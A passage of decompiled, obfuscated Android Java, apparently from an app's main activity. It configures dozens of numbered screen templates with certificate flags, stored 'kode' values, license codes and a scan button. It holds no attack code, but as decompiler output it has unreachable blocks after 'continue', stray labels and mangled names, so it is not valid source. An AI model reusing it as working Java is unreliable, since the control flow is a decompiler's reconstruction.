                                                        ((TextView)findViewById(2131427389)).setText(a(2131165419));
                                                        ((TextView)findViewById(2131427391)).setText(a(2131165428));
                                                        ((TextView)findViewById(2131427392)).setText(a(2131165419));
                                                        try
                                                        {
                                                          this.jdField_a_of_type_DU.p();
                                                          boolean bool1 = localSharedPreferences.getBoolean("isSerteficate27", false);
                                                          this.jdField_a_of_type_JavaLangString = localSharedPreferences.getString("greedKoord", "");
                                                          paramBundle = (ViewFlipper)findViewById(2131427374);
                                                          if (this.jdField_a_of_type_JavaLangString.equals(""))
                                                          {
                                                            if (bool1)
                                                            {
                                                              paramBundle.setDisplayedChild(3);
                                                              ((TextView)findViewById(2131427356)).setText(localSharedPreferences.getString("kode27", a(false)));
                                                              continue;
                                                            }
                                                            paramBundle.setDisplayedChild(0);
                                                            new db(this, (byte)0).execute(new Void[0]);
                                                            continue;
                                                          }
                                                          ((Button)findViewById(2131427379)).setVisibility(8);
                                                          ((Button)findViewById(2131427380)).setVisibility(0);
                                                          ((TextView)findViewById(2131427378)).setText(a(2131165426));
                                                          continue;
                                                          requestWindowFeature(1);
                                                          setContentView(2130903061);
                                                          ((TextView)findViewById(2131427393)).setText(a(2131165429));
                                                          ((TextView)findViewById(2131427378)).setText(a(2131165432));
                                                          ((TextView)findViewById(2131427332)).setText(a(2131165441));
                                                          ((TextView)findViewById(2131427355)).setText(a(2131165438));
                                                          ((TextView)findViewById(2131427357)).setText(a(2131165439));
                                                          ((TextView)findViewById(2131427359)).setText(a(2131165440));
                                                          ((TextView)findViewById(2131427352)).setText(a(2131165442));
                                                          ((TextView)findViewById(2131427361)).setText(a(2131165443));
                                                          ((TextView)findViewById(2131427362)).setText(a(2131165444));
                                                          try
                                                          {
                                                            this.jdField_a_of_type_DU.p();
                                                            bool1 = localSharedPreferences.getBoolean("isSerteficate28", false);
                                                            this.jdField_a_of_type_JavaLangString = localSharedPreferences.getString("greedKoord", "");
                                                            if (this.jdField_a_of_type_JavaLangString.equals(""))
                                                            {
                                                              if (bool1)
                                                              {
                                                                ((ViewFlipper)findViewById(2131427374)).setDisplayedChild(2);
                                                                ((TextView)findViewById(2131427356)).setText(localSharedPreferences.getString("kode28", a(false)));
                                                                continue;
                                                              }
                                                              ((ViewFlipper)findViewById(2131427374)).setDisplayedChild(0);
                                                              new dd(this, (byte)0).execute(new Void[0]);
                                                              continue;
                                                            }
                                                            ((ViewFlipper)findViewById(2131427374)).setDisplayedChild(0);
                                                            ((Button)findViewById(2131427379)).setVisibility(8);
                                                            ((Button)findViewById(2131427380)).setVisibility(0);
                                                            ((TextView)findViewById(2131427378)).setText(a(2131165433));
                                                            paramBundle = this.jdField_a_of_type_JavaLangString.split("-");
                                                            Object localObject = paramBundle[0].split(":");
                                                            ((TextView)findViewById(2131427394)).setText(localObject[0]);
                                                            ((TextView)findViewById(2131427397)).setText(localObject[1]);
                                                            localObject = paramBundle[1].split(":");
                                                            ((TextView)findViewById(2131427395)).setText(localObject[0]);
                                                            ((TextView)findViewById(2131427398)).setText(localObject[1]);
                                                            paramBundle = paramBundle[2].split(":");
                                                            ((TextView)findViewById(2131427396)).setText(paramBundle[0]);
                                                            ((TextView)findViewById(2131427399)).setText(paramBundle[1]);
                                                            b();
                                                            continue;
                                                            requestWindowFeature(1);
                                                            setContentView(2130903062);
                                                            ((TextView)findViewById(2131427332)).setText(a(2131165445));
                                                            ((TextView)findViewById(2131427355)).setText(a(2131165448));
                                                            ((TextView)findViewById(2131427357)).setText(a(2131165449));
                                                            ((TextView)findViewById(2131427356)).setText(a(2131165450));
                                                            ((TextView)findViewById(2131427359)).setText(a(2131165451));
                                                            ((TextView)findViewById(2131427352)).setText(a(2131165447));
                                                            ((TextView)findViewById(2131427361)).setText(a(2131165446));
                                                            try
                                                            {
                                                              this.jdField_a_of_type_DU.p();
                                                              localSharedPreferences.getBoolean("isSerteficate29", false);
                                                              findViewById(2131427353).setVisibility(8);
                                                              findViewById(2131427347).setVisibility(0);
                                                              continue;
                                                              requestWindowFeature(1);
                                                              setContentView(2130903064);
                                                              ((TextView)findViewById(2131427355)).setText(a(2131165455));
                                                              ((TextView)findViewById(2131427356)).setText(a(2131165457));
                                                              ((TextView)findViewById(2131427359)).setText(a(2131165456));
                                                              ((TextView)findViewById(2131427352)).setText(a(2131165454));
                                                              ((Button)findViewById(2131427404)).setText(a(2131165453));
                                                              try
                                                              {
                                                                this.jdField_a_of_type_DU.p();
                                                                localSharedPreferences.getBoolean("isSerteficate30", false);
                                                                findViewById(2131427353).setVisibility(8);
                                                                findViewById(2131427347).setVisibility(0);
                                                                continue;
                                                                requestWindowFeature(1);
                                                                setContentView(2130903065);
                                                                ((TextView)findViewById(2131427332)).setText(a(2131165461));
                                                                ((TextView)findViewById(2131427357)).setText(a(2131165464));
                                                                ((TextView)findViewById(2131427356)).setText(a(2131165465));
                                                                ((TextView)findViewById(2131427359)).setText(a(2131165463));
                                                                ((TextView)findViewById(2131427361)).setText(a(2131165459));
                                                                ((TextView)findViewById(2131427362)).setText(a(2131165460));
                                                                try
                                                                {
                                                                  this.jdField_a_of_type_DU.p();
                                                                  if (!localSharedPreferences.getBoolean("isSerteficate31", false))
                                                                  {
                                                                    findViewById(2131427353).setVisibility(8);
                                                                    findViewById(2131427347).setVisibility(0);
                                                                    continue;
                                                                  }
                                                                  ((TextView)findViewById(2131427356)).setText(localSharedPreferences.getString("kode31", a(false)));
                                                                  continue;
                                                                  requestWindowFeature(1);
                                                                  setContentView(2130903066);
                                                                  ((TextView)findViewById(2131427332)).setText(a(2131165467));
                                                                  ((TextView)findViewById(2131427357)).setText(a(2131165471));
                                                                  ((TextView)findViewById(2131427356)).setText(a(2131165472));
                                                                  ((TextView)findViewById(2131427359)).setText(a(2131165473));
                                                                  ((TextView)findViewById(2131427352)).setText(a(2131165470));
                                                                  ((EditText)findViewById(2131427348)).setHint(a(2131165468));
                                                                  ((EditText)findViewById(2131427349)).setHint(a(2131165469));
                                                                  try
                                                                  {
                                                                    this.jdField_a_of_type_DU.p();
                                                                    bool1 = localSharedPreferences.getBoolean("isSerteficate32", false);
                                                                    findViewById(2131427353).setVisibility(8);
                                                                    findViewById(2131427347).setVisibility(0);
                                                                    if (!bool1) {
                                                                      continue;
                                                                    }
                                                                    findViewById(2131427348).setVisibility(8);
                                                                    findViewById(2131427349).setVisibility(8);
                                                                    continue;
                                                                    requestWindowFeature(1);
                                                                    setContentView(2130903067);
                                                                    ((TextView)findViewById(2131427357)).setText(a(2131165480));
                                                                    ((TextView)findViewById(2131427356)).setText(a(2131165481));
                                                                    ((TextView)findViewById(2131427359)).setText(a(2131165479));
                                                                    ((TextView)findViewById(2131427361)).setText(a(2131165476));
                                                                    ((TextView)findViewById(2131427362)).setText(a(2131165477));
                                                                    ((Button)findViewById(2131427340)).setText(a(2131165478));
                                                                    try
                                                                    {
                                                                      this.jdField_a_of_type_DU.p();
                                                                      if (!localSharedPreferences.getBoolean("isSerteficate33", false))
                                                                      {
                                                                        findViewById(2131427353).setVisibility(8);
                                                                        findViewById(2131427347).setVisibility(0);
                                                                        continue;
                                                                      }
                                                                      ((TextView)findViewById(2131427356)).setText(localSharedPreferences.getString("kode33", a(false)));
                                                                      continue;
                                                                      requestWindowFeature(1);
                                                                      setContentView(2130903068);
                                                                      ((TextView)findViewById(2131427357)).setText(a(2131165488));
                                                                      ((TextView)findViewById(2131427356)).setText(a(2131165489));
                                                                      ((TextView)findViewById(2131427359)).setText(a(2131165487));
                                                                      ((TextView)findViewById(2131427352)).setText(a(2131165485));
                                                                      ((TextView)findViewById(2131427361)).setText(a(2131165483));
                                                                      ((TextView)findViewById(2131427362)).setText(a(2131165484));
                                                                      try
                                                                      {
                                                                        this.jdField_a_of_type_DU.p();
                                                                        if (!localSharedPreferences.getBoolean("isSerteficate34", false))
                                                                        {
                                                                          findViewById(2131427353).setVisibility(8);
                                                                          findViewById(2131427347).setVisibility(0);
                                                                          continue;
                                                                        }
                                                                        ((TextView)findViewById(2131427356)).setText(localSharedPreferences.getString("kode34", a(false)));
                                                                        continue;
                                                                        requestWindowFeature(1);
                                                                        setContentView(2130903063);
                                                                        ((TextView)findViewById(2131427332)).setText(a(2131165210));
                                                                        ((TextView)findViewById(2131427355)).setText(a(2131165211));
                                                                        ((TextView)findViewById(2131427357)).setText(a(2131165212));
                                                                        ((TextView)findViewById(2131427356)).setText(a(2131165213));
                                                                        ((TextView)findViewById(2131427359)).setText(a(2131165214));
                                                                        ((TextView)findViewById(2131427352)).setText(a(2131165215));
                                                                        ((TextView)findViewById(2131427361)).setText(a(2131165216));
                                                                        ((TextView)findViewById(2131427362)).setText(a(2131165217));
                                                                        ((TextView)findViewById(2131427385)).setText(a(2131165218));
                                                                        ((TextView)findViewById(2131427387)).setText(a(2131165219));
                                                                        ((TextView)findViewById(2131427388)).setText(a(2131165220));
                                                                        ((Button)findViewById(2131427340)).setText(a(2131165221));
                                                                        try
                                                                        {
                                                                          this.jdField_a_of_type_DU.p();
                                                                          ((TextView)findViewById(2131427342)).setText(a(true));
                                                                          onScanNow(findViewById(2131427340));
                                                                          continue;
                                                                          requestWindowFeature(1);
                                                                          setContentView(2130903069);
                                                                          ((TextView)findViewById(2131427355)).setText(a(2131165494));
                                                                          ((TextView)findViewById(2131427357)).setText(a(2131165495));
                                                                          ((TextView)findViewById(2131427359)).setText(a(2131165497));
                                                                          ((TextView)findViewById(2131427352)).setText(a(2131165493));
                                                                          ((TextView)findViewById(2131427361)).setText(a(2131165491));
                                                                          ((TextView)findViewById(2131427362)).setText(a(2131165491));
                                                                          try
                                                                          {
                                                                            this.jdField_a_of_type_DU.p();
                                                                            localSharedPreferences.getBoolean("isSerteficate36", false);
                                                                            findViewById(2131427353).setVisibility(8);
                                                                            findViewById(2131427347).setVisibility(0);
                                                                            continue;
                                                                            requestWindowFeature(1);
                                                                            setContentView(2130903070);
                                                                            ((TextView)findViewById(2131427355)).setText(a(2131165502));
                                                                            ((TextView)findViewById(2131427357)).setText(a(2131165503));
                                                                            ((TextView)findViewById(2131427359)).setText(a(2131165505));
                                                                            ((TextView)findViewById(2131427352)).setText(a(2131165501));
                                                                            ((TextView)findViewById(2131427361)).setText(a(2131165500));
                                                                            ((TextView)findViewById(2131427362)).setText(a(2131165499));
                                                                            try
                                                                            {
                                                                              this.jdField_a_of_type_DU.p();
                                                                              localSharedPreferences.getBoolean("isSerteficate37", false);
                                                                              findViewById(2131427353).setVisibility(8);
                                                                              findViewById(2131427347).setVisibility(0);
                                                                              continue;
                                                                              requestWindowFeature(1);
                                                                              setContentView(2130903071);
                                                                              ((TextView)findViewById(2131427408)).setText(a(2131165511));
                                                                              ((TextView)findViewById(2131427411)).setText(a(2131165507));
                                                                              ((TextView)findViewById(2131427414)).setText(a(2131165509));
                                                                              ((Button)findViewById(2131427340)).setText(a(2131165513));
                                                                              try
                                                                              {
                                                                                this.jdField_a_of_type_DU.p();
                                                                                if (!localSharedPreferences.getBoolean("isSerteficate38", false))
                                                                                {
                                                                                  paramBundle = a(true);
                                                                                  localObject = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit();
                                                                                  ((SharedPreferences.Editor)localObject).putBoolean("isSerteficate38", true);
                                                                                  ((SharedPreferences.Editor)localObject).putString("kode38", paramBundle);
                                                                                  ((SharedPreferences.Editor)localObject).commit();
                                                                                }
                                                                                ((TextView)findViewById(2131427415)).setText(a(2131165516) + "\n" + localSharedPreferences.getString("kode38", a(false)));
                                                                                continue;
                                                                                requestWindowFeature(1);
                                                                                setContentView(2130903092);
                                                                                ((TextView)findViewById(2131427332)).setText(a(2131165238));
                                                                                ((TextView)findViewById(2131427355)).setText(a(2131165242));
                                                                                ((TextView)findViewById(2131427357)).setText(a(2131165244));
                                                                                ((TextView)findViewById(2131427359)).setText(a(2131165245));
                                                                                ((TextView)findViewById(2131427352)).setText(a(2131165246));
                                                                                ((TextView)findViewById(2131427361)).setText(a(2131165247));
                                                                                ((Button)findViewById(2131427340)).setText(a(2131165239));
                                                                                try
                                                                                {
                                                                                  this.jdField_a_of_type_DU.p();
                                                                                  ((TextView)findViewById(2131427356)).setText(localSharedPreferences.getString("kode39", a(false)));
                                                                                  continue;
                                                                                  requestWindowFeature(1);
                                                                                  setContentView(2130903073);
                                                                                  ((TextView)findViewById(2131427415)).setText(a(2131165517));
                                                                                  ((TextView)findViewById(2131427416).findViewById(2131427418)).setText(a(2131165518));
                                                                                  ((TextView)findViewById(2131427419).findViewById(2131427420)).setText(a(2131165520));
                                                                                  ((TextView)findViewById(2131427421).findViewById(2131427422)).setText(a(2131165522));
                                                                                  try
                                                                                  {
                                                                                    this.jdField_a_of_type_DU.p();
                                                                                    if (!localSharedPreferences.getBoolean("isSerteficate40", false))
                                                                                    {
                                                                                      paramBundle = a(true);
                                                                                      localObject = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit();
                                                                                      ((SharedPreferences.Editor)localObject).putBoolean("isSerteficate40", true);
                                                                                      ((SharedPreferences.Editor)localObject).putString("kode40", paramBundle);
                                                                                      ((SharedPreferences.Editor)localObject).commit();
                                                                                    }
                                                                                    ((TextView)findViewById(2131427415)).setText(a(2131165517) + "\n" + localSharedPreferences.getString("kode40", a(false)));
                                                                                    continue;
                                                                                    requestWindowFeature(1);
                                                                                    setContentView(2130903074);
                                                                                    ((TextView)findViewById(2131427357)).setText(a(2131165526));
                                                                                    ((TextView)findViewById(2131427359)).setText(a(2131165527));
                                                                                    ((TextView)findViewById(2131427352)).setText(a(2131165528));
                                                                                    ((TextView)findViewById(2131427361)).setText(a(2131165529));
                                                                                    ((Button)findViewById(2131427340)).setText(a(2131165530));
                                                                                    try
                                                                                    {
                                                                                      this.jdField_a_of_type_DU.p();
                                                                                      findViewById(2131427351).setVisibility(8);
                                                                                      localSharedPreferences.getBoolean("isSerteficate41", false);
                                                                                      findViewById(2131427356).setVisibility(8);
                                                                                      paramBundle = localSharedPreferences.getString("license_code", "");
                                                                                      if (!paramBundle.equals("")) {
                                                                                        break label13241;
                                                                                      }
                                                                                      paramBundle = b();
                                                                                      ((TextView)findViewById(2131427332)).setText(a(2131165531) + " " + paramBundle);
                                                                                      continue;
                                                                                      requestWindowFeature(1);
                                                                                      setContentView(2130903075);
                                                                                      ((TextView)findViewById(2131427357)).setText(a(2131165532));
                                                                                      ((TextView)findViewById(2131427359)).setText(a(2131165533));
                                                                                      ((TextView)findViewById(2131427352)).setText(a(2131165534));
                                                                                      ((TextView)findViewById(2131427361)).setText(a(2131165535));
                                                                                      ((Button)findViewById(2131427340)).setText(a(2131165536));
                                                                                      try
                                                                                      {
                                                                                        this.jdField_a_of_type_DU.p();
                                                                                        findViewById(2131427351).setVisibility(8);
                                                                                        localSharedPreferences.getBoolean("isSerteficate42", false);
                                                                                        findViewById(2131427356).setVisibility(8);
                                                                                        paramBundle = localSharedPreferences.getString("license_code", "");
                                                                                        if (paramBundle.equals(""))
                                                                                        {
                                                                                          paramBundle = b();
                                                                                          ((TextView)findViewById(2131427332)).setText(a(2131165537) + " " + paramBundle);
                                                                                          continue;
                                                                                          requestWindowFeature(1);
                                                                                          setContentView(2130903076);
                                                                                          ((TextView)findViewById(2131427359)).setText(a(2131165538));
                                                                                          ((Button)findViewById(2131427425)).setText(a(2131165539));
                                                                                          ((Button)findViewById(2131427426)).setText(a(2131165541));
                                                                                          ((Button)findViewById(2131427427)).setText(a(2131165540));
                                                                                          ((Button)findViewById(2131427430)).setText(a(2131165543));
                                                                                          ((Button)findViewById(2131427433)).setText(a(2131165543));
                                                                                          try
                                                                                          {
                                                                                            this.jdField_a_of_type_DU.p();
                                                                                            findViewById(2131427424).setVisibility(4);
                                                                                            localSharedPreferences.getBoolean("isSerteficate43", false);
                                                                                            findViewById(2131427356).setVisibility(8);
                                                                                            findViewById(2131427351).setVisibility(8);
                                                                                            paramBundle = localSharedPreferences.getString("license_code", "");
                                                                                            if (!paramBundle.equals(""))
                                                                                            {
                                                                                              ((TextView)findViewById(2131427432)).setText(paramBundle);
                                                                                              findViewById(2131427433).setVisibility(8);
                                                                                              continue;
                                                                                            }
                                                                                            ((TextView)findViewById(2131427432)).setVisibility(8);
                                                                                            continue;
                                                                                            requestWindowFeature(1);
                                                                                            setContentView(2130903077);
                                                                                            ((TextView)findViewById(2131427359)).setText(a(2131165544));
                                                                                            ((Button)findViewById(2131427425)).setText(a(2131165545));
                                                                                            ((Button)findViewById(2131427426)).setText(a(2131165547));
                                                                                            ((Button)findViewById(2131427427)).setText(a(2131165546));
                                                                                            ((Button)findViewById(2131427430)).setText(a(2131165549));
                                                                                            ((Button)findViewById(2131427433)).setText(a(2131165549));
                                                                                            try
                                                                                            {
                                                                                              this.jdField_a_of_type_DU.p();
                                                                                              findViewById(2131427424).setVisibility(4);
                                                                                              findViewById(2131427356).setVisibility(8);
                                                                                              findViewById(2131427351).setVisibility(8);
                                                                                              paramBundle = localSharedPreferences.getString("license_code44", "");
                                                                                              if (!paramBundle.equals(""))
                                                                                              {
                                                                                                ((TextView)findViewById(2131427432)).setText(paramBundle);
                                                                                                findViewById(2131427433).setVisibility(8);
                                                                                                continue;
                                                                                              }
                                                                                              ((TextView)findViewById(2131427432)).setVisibility(8);
                                                                                              continue;
                                                                                              requestWindowFeature(1);
                                                                                              setContentView(2130903078);
                                                                                              try
                                                                                              {
                                                                                                this.jdField_a_of_type_DU.p();
                                                                                                if (!localSharedPreferences.getBoolean("isSerteficate45", false))
                                                                                                {
                                                                                                  findViewById(2131427438).setVisibility(8);
                                                                                                  findViewById(2131427347).setVisibility(0);
                                                                                                  continue;
                                                                                                }
                                                                                                findViewById(2131427438).setVisibility(0);
                                                                                                findViewById(2131427347).setVisibility(8);
                                                                                                findViewById(2131427353).setVisibility(0);
                                                                                                findViewById(2131427350).setVisibility(8);
                                                                                                paramBundle = new ScaleAnimation(0.0F, 1.0F, 0.0F, 1.0F, 1, 0.5F, 1, 0.5F);
                                                                                                paramBundle.setDuration(1000L);
                                                                                                findViewById(2131427438).setAnimation(paramBundle);
                                                                                                ((TextView)findViewById(2131427356)).setText(localSharedPreferences.getString("kode45", a(false)));
                                                                                                continue;
                                                                                                requestWindowFeature(1);
                                                                                                setContentView(2130903079);
                                                                                                try
                                                                                                {
                                                                                                  this.jdField_a_of_type_DU.p();
                                                                                                  if (!localSharedPreferences.getBoolean("isSerteficate46", false))
                                                                                                  {
                                                                                                    findViewById(2131427438).setVisibility(8);
                                                                                                    findViewById(2131427347).setVisibility(0);
                                                                                                    continue;
                                                                                                  }
                                                                                                  findViewById(2131427438).setVisibility(0);
                                                                                                  findViewById(2131427347).setVisibility(8);
                                                                                                  findViewById(2131427353).setVisibility(0);
                                                                                                  findViewById(2131427350).setVisibility(8);
                                                                                                  paramBundle = new ScaleAnimation(0.0F, 1.0F, 0.0F, 1.0F, 1, 0.5F, 1, 0.5F);
                                                                                                  paramBundle.setDuration(1000L);
                                                                                                  findViewById(2131427438).setAnimation(paramBundle);
                                                                                                  ((TextView)findViewById(2131427356)).setText(localSharedPreferences.getString("kode46", a(false)));
                                                                                                  continue;
                                                                                                  requestWindowFeature(1);
                                                                                                  setContentView(2130903080);
                                                                                                  try
                                                                                                  {
                                                                                                    this.jdField_a_of_type_DU.p();
                                                                                                    findViewById(2131427403).setVisibility(4);
                                                                                                    continue;
                                                                                                    requestWindowFeature(1);
                                                                                                    setContentView(2130903081);
                                                                                                    try
                                                                                                    {
                                                                                                      this.jdField_a_of_type_DU.p();
                                                                                                      if (!localSharedPreferences.getBoolean("isSerteficate48", false))
                                                                                                      {
                                                                                                        findViewById(2131427353).setVisibility(8);
                                                                                                        findViewById(2131427347).setVisibility(0);
                                                                                                        continue;
                                                                                                      }
                                                                                                      findViewById(2131427347).setVisibility(8);
                                                                                                      findViewById(2131427353).setVisibility(0);
                                                                                                      ((TextView)findViewById(2131427356)).setText(localSharedPreferences.getString("kode36", a(false)));
                                                                                                      continue;
                                                                                                      requestWindowFeature(1);
                                                                                                      setContentView(2130903082);
                                                                                                      try
                                                                                                      {
                                                                                                        this.jdField_a_of_type_DU.p();
                                                                                                        bool1 = localSharedPreferences.getBoolean("template49_check1", true);
                                                                                                        boolean bool2 = localSharedPreferences.getBoolean("template49_check2", true);
                                                                                                        boolean bool3 = localSharedPreferences.getBoolean("template49_check3", true);
                                                                                                        boolean bool4 = localSharedPreferences.getBoolean("template49_check4", false);
                                                                                                        paramBundle = localSharedPreferences.getString("template49_last_time", "");
                                                                                                        if (paramBundle.equals(""))
                                                                                                        {
                                                                                                          ((TextView)findViewById(2131427445)).setText(getString(2131165578));
                                                                                                          if (bool1)
                                                                                                          {
                                                                                                            ((ImageView)findViewById(2131427441)).setImageResource(a("template49_on"));
                                                                                                            ((ImageView)findViewById(2131427441)).setTag(Boolean.valueOf(true));
                                                                                                            if (!bool2) {
                                                                                                              continue;
                                                                                                            }
                                                                                                            ((ImageView)findViewById(2131427442)).setImageResource(a("template49_on"));
                                                                                                            ((ImageView)findViewById(2131427442)).setTag(Boolean.valueOf(true));
                                                                                                            if (!bool3) {
                                                                                                              continue;
                                                                                                            }
                                                                                                            ((ImageView)findViewById(2131427443)).setImageResource(a("template49_on"));
                                                                                                            ((ImageView)findViewById(2131427443)).setTag(Boolean.valueOf(true));
                                                                                                            if (!bool4) {
                                                                                                              continue;
                                                                                                            }
                                                                                                            ((ImageView)findViewById(2131427444)).setImageResource(a("template49_on"));
                                                                                                            ((ImageView)findViewById(2131427444)).setTag(Boolean.valueOf(true));
                                                                                                            localObject = localSharedPreferences.getString("template49_kode", "");
                                                                                                            paramBundle = (Bundle)localObject;
                                                                                                            if (((String)localObject).equals(""))
                                                                                                            {
                                                                                                              paramBundle = a(false);
                                                                                                              localObject = localSharedPreferences.edit();
                                                                                                              ((SharedPreferences.Editor)localObject).putString("template49_kode", paramBundle);
                                                                                                              ((SharedPreferences.Editor)localObject).commit();
                                                                                                            }
                                                                                                            ((TextView)findViewById(2131427357)).setText(getString(2131165583) + " " + paramBundle);
                                                                                                          }
                                                                                                        }
                                                                                                        else
                                                                                                        {
                                                                                                          ((TextView)findViewById(2131427445)).setText(getString(2131165576) + " " + paramBundle);
                                                                                                          continue;
                                                                                                        }
                                                                                                        ((ImageView)findViewById(2131427441)).setImageResource(a("template49_off"));
                                                                                                        ((ImageView)findViewById(2131427441)).setTag(Boolean.valueOf(false));
                                                                                                        continue;
                                                                                                        ((ImageView)findViewById(2131427442)).setImageResource(a("template49_off"));
                                                                                                        ((ImageView)findViewById(2131427442)).setTag(Boolean.valueOf(false));
                                                                                                        continue;
                                                                                                        ((ImageView)findViewById(2131427443)).setImageResource(a("template49_off"));
                                                                                                        ((ImageView)findViewById(2131427443)).setTag(Boolean.valueOf(false));
                                                                                                        continue;
                                                                                                        ((ImageView)findViewById(2131427444)).setImageResource(a("template49_off"));
                                                                                                        ((ImageView)findViewById(2131427444)).setTag(Boolean.valueOf(false));
                                                                                                        continue;
                                                                                                        requestWindowFeature(1);
                                                                                                        setContentView(2130903084);
                                                                                                        try
                                                                                                        {
                                                                                                          this.jdField_a_of_type_DU.p();
                                                                                                          bool1 = localSharedPreferences.getBoolean("template50_check1", true);
                                                                                                          bool2 = localSharedPreferences.getBoolean("template50_check2", true);
                                                                                                          bool3 = localSharedPreferences.getBoolean("template50_check3", true);
                                                                                                          bool4 = localSharedPreferences.getBoolean("template50_check4", false);
                                                                                                          paramBundle = localSharedPreferences.getString("template50_last_time", "");
                                                                                                          if (paramBundle.equals(""))
                                                                                                          {
                                                                                                            ((TextView)findViewById(2131427445)).setText(getString(2131165591));
                                                                                                            if (bool1)
                                                                                                            {
                                                                                                              ((ImageView)findViewById(2131427441)).setImageResource(a("template50_on"));
                                                                                                              ((ImageView)findViewById(2131427441)).setTag(Boolean.valueOf(true));
                                                                                                              if (!bool2) {
                                                                                                                continue;
                                                                                                              }
                                                                                                              ((ImageView)findViewById(2131427442)).setImageResource(a("template50_on"));
                                                                                                              ((ImageView)findViewById(2131427442)).setTag(Boolean.valueOf(true));
                                                                                                              if (!bool3) {
                                                                                                                continue;
                                                                                                              }
                                                                                                              ((ImageView)findViewById(2131427443)).setImageResource(a("template50_on"));
                                                                                                              ((ImageView)findViewById(2131427443)).setTag(Boolean.valueOf(true));
                                                                                                              if (!bool4) {
                                                                                                                continue;
                                                                                                              }
                                                                                                              ((ImageView)findViewById(2131427444)).setImageResource(a("template50_on"));
                                                                                                              ((ImageView)findViewById(2131427444)).setTag(Boolean.valueOf(true));
                                                                                                              localObject = localSharedPreferences.getString("template50_kode", "");
                                                                                                              paramBundle = (Bundle)localObject;
                                                                                                              if (((String)localObject).equals(""))
                                                                                                              {
                                                                                                                paramBundle = a(false);
                                                                                                                localObject = localSharedPreferences.edit();
                                                                                                                ((SharedPreferences.Editor)localObject).putString("template50_kode", paramBundle);
                                                                                                                ((SharedPreferences.Editor)localObject).commit();
                                                                                                              }
                                                                                                              ((TextView)findViewById(2131427357)).setText(getString(2131165596) + " " + paramBundle);
                                                                                                            }
                                                                                                          }
                                                                                                          else
                                                                                                          {
                                                                                                            ((TextView)findViewById(2131427445)).setText(getString(2131165589) + " " + paramBundle);
                                                                                                            continue;
                                                                                                          }
                                                                                                          ((ImageView)findViewById(2131427441)).setImageResource(a("template50_off"));
                                                                                                          ((ImageView)findViewById(2131427441)).setTag(Boolean.valueOf(false));
                                                                                                          continue;
                                                                                                          ((ImageView)findViewById(2131427442)).setImageResource(a("template50_off"));
                                                                                                          ((ImageView)findViewById(2131427442)).setTag(Boolean.valueOf(false));
                                                                                                          continue;
                                                                                                          ((ImageView)findViewById(2131427443)).setImageResource(a("template50_off"));
                                                                                                          ((ImageView)findViewById(2131427443)).setTag(Boolean.valueOf(false));
                                                                                                          continue;
                                                                                                          ((ImageView)findViewById(2131427444)).setImageResource(a("template50_off"));
                                                                                                          ((ImageView)findViewById(2131427444)).setTag(Boolean.valueOf(false));
                                                                                                          continue;
                                                                                                          requestWindowFeature(1);
                                                                                                          setContentView(getResources().getIdentifier("activity_main" + getString(2131165185), "layout", getPackageName()));
                                                                                                          try
                                                                                                          {
                                                                                                            this.jdField_a_of_type_DU.p();
                                                                                                            this.jdField_a_of_type_Cy = new cy(this);
                                                                                                            paramBundle = (ListView)findViewById(2131427446);
                                                                                                            paramBundle.setAdapter(this.jdField_a_of_type_Cy);
                                                                                                            paramBundle.setOnItemClickListener(new cE(this));
                                                                                                            if (this.jdField_a_of_type_Cy.a.size() != 0) {
                                                                                                              continue;
                                                                                                            }
                                                                                                            findViewById(2131427457).performClick();
                                                                                                            continue;
                                                                                                            requestWindowFeature(1);
                                                                                                            setContentView(2130903086);
                                                                                                            try
                                                                                                            {
                                                                                                              this.jdField_a_of_type_DU.p();
                                                                                                              if (!localSharedPreferences.getBoolean("isSerteficate52", false))
                                                                                                              {
                                                                                                                findViewById(2131427353).setVisibility(8);
                                                                                                                findViewById(2131427347).setVisibility(0);
                                                                                                                continue;
                                                                                                              }
                                                                                                              ((TextView)findViewById(2131427356)).setText(localSharedPreferences.getString("kode52", a(false)));
                                                                                                              continue;
                                                                                                              requestWindowFeature(1);
                                                                                                              setContentView(2130903087);
                                                                                                              try
                                                                                                              {
                                                                                                                this.jdField_a_of_type_DU.p();
                                                                                                                if (!localSharedPreferences.getBoolean("isSerteficate53", false))
                                                                                                                {
                                                                                                                  paramBundle = a(true);
                                                                                                                  localObject = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit();
                                                                                                                  ((SharedPreferences.Editor)localObject).putBoolean("isSerteficate53", true);
                                                                                                                  ((SharedPreferences.Editor)localObject).putString("kode53", paramBundle);
                                                                                                                  ((SharedPreferences.Editor)localObject).commit();
                                                                                                                }
                                                                                                                ((TextView)findViewById(2131427415)).setText(getString(2131165618) + "\n" + localSharedPreferences.getString("kode53", a(false)));
                                                                                                                continue;
                                                                                                                requestWindowFeature(1);
                                                                                                                setContentView(2130903088);
                                                                                                                try
                                                                                                                {
                                                                                                                  this.jdField_a_of_type_DU.p();
                                                                                                                  if (!localSharedPreferences.getBoolean("isSerteficate54", false))
                                                                                                                  {
                                                                                                                    paramBundle = a(true);
                                                                                                                    localObject = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit();
                                                                                                                    ((SharedPreferences.Editor)localObject).putBoolean("isSerteficate54", true);
                                                                                                                    ((SharedPreferences.Editor)localObject).putString("kode54", paramBundle);
                                                                                                                    ((SharedPreferences.Editor)localObject).commit();
                                                                                                                  }
                                                                                                                  ((TextView)findViewById(2131427415)).setText(getString(2131165627) + "\n" + localSharedPreferences.getString("kode54", a(false)));
                                                                                                                  continue;
                                                                                                                  requestWindowFeature(1);
                                                                                                                  setContentView(2130903089);
                                                                                                                  try
                                                                                                                  {
                                                                                                                    this.jdField_a_of_type_DU.p();
                                                                                                                    if (!localSharedPreferences.getBoolean("isSerteficate55", false))
                                                                                                                    {
                                                                                                                      findViewById(2131427353).setVisibility(8);
                                                                                                                      findViewById(2131427347).setVisibility(0);
                                                                                                                      continue;
                                                                                                                    }
                                                                                                                    ((TextView)findViewById(2131427356)).setText(localSharedPreferences.getString("kode55", a(false)));
                                                                                                                    continue;
                                                                                                                    requestWindowFeature(1);
                                                                                                                    setContentView(2130903090);
                                                                                                                    try
                                                                                                                    {
                                                                                                                      this.jdField_a_of_type_DU.p();
                                                                                                                      if (!localSharedPreferences.getBoolean("isSerteficate56", false))
                                                                                                                      {
                                                                                                                        findViewById(2131427353).setVisibility(8);
                                                                                                                        findViewById(2131427347).setVisibility(0);
                                                                                                                        continue;
                                                                                                                      }
                                                                                                                      findViewById(2131427353).setVisibility(0);
                                                                                                                      findViewById(2131427347).setVisibility(8);
